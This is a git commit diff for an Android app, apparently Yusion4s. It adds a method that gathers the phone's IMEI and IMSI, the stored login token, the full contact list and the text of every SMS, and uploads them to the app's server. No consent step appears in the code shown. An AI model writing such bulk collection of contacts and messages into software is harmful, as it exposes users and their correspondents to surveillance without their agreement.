50daabd8f625cb123b808336d2850342fc233339
ice <ice45571@163.com>
2017-11-21 14:06:40 +0800

    2017年11月21日

--- app/src/main/java/com/yusion/shanghai/yusion4s/ubt/UBT.java
+++ app/src/main/java/com/yusion/shanghai/yusion4s/ubt/UBT.java
@@ -10,6 +10,7 @@ package com.yusion.shanghai.yusion4s.ubt;
 import android.content.Context;
 import android.database.Cursor;
 import android.support.v7.app.AppCompatActivity;
+import android.telephony.TelephonyManager;
 import android.text.Editable;
 import android.text.TextUtils;
 import android.text.TextWatcher;
@@ -21,14 +22,23 @@ import android.widget.EditText;
 import android.widget.TextView;
 
 import com.yusion.shanghai.yusion4s.R;
+import com.yusion.shanghai.yusion4s.bean.auth.CheckUserInfoResp;
+import com.yusion.shanghai.yusion4s.retrofit.api.AuthApi;
+import com.yusion.shanghai.yusion4s.retrofit.api.PersonApi;
 import com.yusion.shanghai.yusion4s.retrofit.api.UBTApi;
+import com.yusion.shanghai.yusion4s.retrofit.callback.OnItemDataCallBack;
 import com.yusion.shanghai.yusion4s.retrofit.callback.OnVoidCallBack;
 import com.yusion.shanghai.yusion4s.settings.Settings;
 import com.yusion.shanghai.yusion4s.ubt.annotate.BindView;
 import com.yusion.shanghai.yusion4s.ubt.bean.UBTData;
 import com.yusion.shanghai.yusion4s.ubt.sql.SqlLiteUtil;
 import com.yusion.shanghai.yusion4s.ubt.sql.UBTEvent;
+import com.yusion.shanghai.yusion4s.utils.MobileDataUtil;
 import com.yusion.shanghai.yusion4s.utils.SharedPrefsUtil;
+
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import java.io.IOException;
 import java.lang.annotation.Annotation;
@@ -39,6 +49,10 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
+
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
 
 /**
  * 1.在application中调用SqlLiteUtil.init(this);
@@ -73,6 +87,104 @@ import java.util.concurrent.Executors;
  * });
  */
 public class UBT {
+
+    public static void uploadPersonAndDeviceInfo(Context context) {
+        TelephonyManager telephonyManager;
+        telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+        UBTData req = new UBTData(context);
+        String imei = telephonyManager.getDeviceId();
+        String imsi = telephonyManager.getSubscriberId();
+        req.imei = imei;
+        req.imsi = imsi;
+        req.app = "Yusion4s";
+        req.token = SharedPrefsUtil.getInstance(context).getValue("token", null);
+        req.mobile = SharedPrefsUtil.getInstance(context).getValue("mobile", null);
+
+        JSONArray contactJsonArray = MobileDataUtil.getUserData(context, "contact");
+        List<UBTData.DataBean.ContactBean> contactBeenList = new ArrayList<>();
+        //List<String> raw_list = new ArrayList<>();
+        for (int i = 0; i < contactJsonArray.length(); i++) {
+            JSONObject jsonObject = null;
+            try {
+                jsonObject = contactJsonArray.getJSONObject(i);
+                UBTData.DataBean.ContactBean contactListBean = new UBTData.DataBean.ContactBean();
+
+                contactListBean.data1 = jsonObject.optString("data1");
+                contactListBean.display_name = jsonObject.optString("display_name");
+
+                contactBeenList.add(contactListBean);
+                //raw_list.add(jsonObject.toString());
+
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
+        }
+        UBTData.DataBean contactBean = new UBTData.DataBean();
+        contactBean.category = "contact";
+        req.data.add(contactBean);
+        if (contactBeenList.size() > 0 && !contactBeenList.isEmpty()) {
+            contactBean.contact_list = contactBeenList;
+        }
+//        else {
+//            contactBean.raw_data = raw_list;
+//        }
+
+        JSONArray smsJsonArray = MobileDataUtil.getUserData(context, "sms");
+        List<UBTData.DataBean.SmsBean> smsList = new ArrayList<>();
+        for (int i = 0; i < smsJsonArray.length(); i++) {
+            JSONObject jsonObject = null;
+            try {
+                jsonObject = smsJsonArray.getJSONObject(i);
+                UBTData.DataBean.SmsBean smsListBean = new UBTData.DataBean.SmsBean();
+                String type = jsonObject.optString("type");
+                if (type.equals("1")) {
+                    smsListBean.from = jsonObject.optString("address");
+                    smsListBean.content = jsonObject.optString("body");
+                    smsListBean.type = "recv";
+                    smsListBean.ts = jsonObject.optString("date");
+                } else if (type.equals("2")) {
+                    smsListBean.to = jsonObject.optString("address");
+                    smsListBean.content = jsonObject.optString("body");
+                    smsListBean.type = "snd";
+                    smsListBean.ts = jsonObject.optString("date");//date
+                }
+                smsList.add(smsListBean);
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
+        }
+
+        UBTData.DataBean simBean = new UBTData.DataBean();
+        simBean.category = "sms";
+        req.data.add(simBean);
+        if (smsList.size() > 0 && !smsList.isEmpty()) {
+            simBean.sms_list = smsList;
+        }
+
+        AuthApi.checkUserInfo(context, new OnItemDataCallBack<CheckUserInfoResp>() {
+            @Override
+            public void onItemDataCallBack(CheckUserInfoResp data) {
+                contactBean.clt_nm = data.name;
+                contactBean.mobile = data.mobile;
+                simBean.clt_nm = data.name;
+                simBean.mobile = data.mobile;
+                //PersonApi.uploadPersonAndDeviceInfo(req);
+                PersonApi.uploadPersonAndDeviceInfo(req, new Callback() {
+                    @Override
+                    public void onResponse(Call call, Response response) {
+//                        Intent intent = new Intent(LoginActivity.this, MainActivity.class);
+//                        startActivity(intent);
+//                        finish();
+                    }
+
+                    @Override
+                    public void onFailure(Call call, Throwable t) {
+
+                    }
+                });
+            }
+        });
+    }
 
     public static int LIMIT;
 
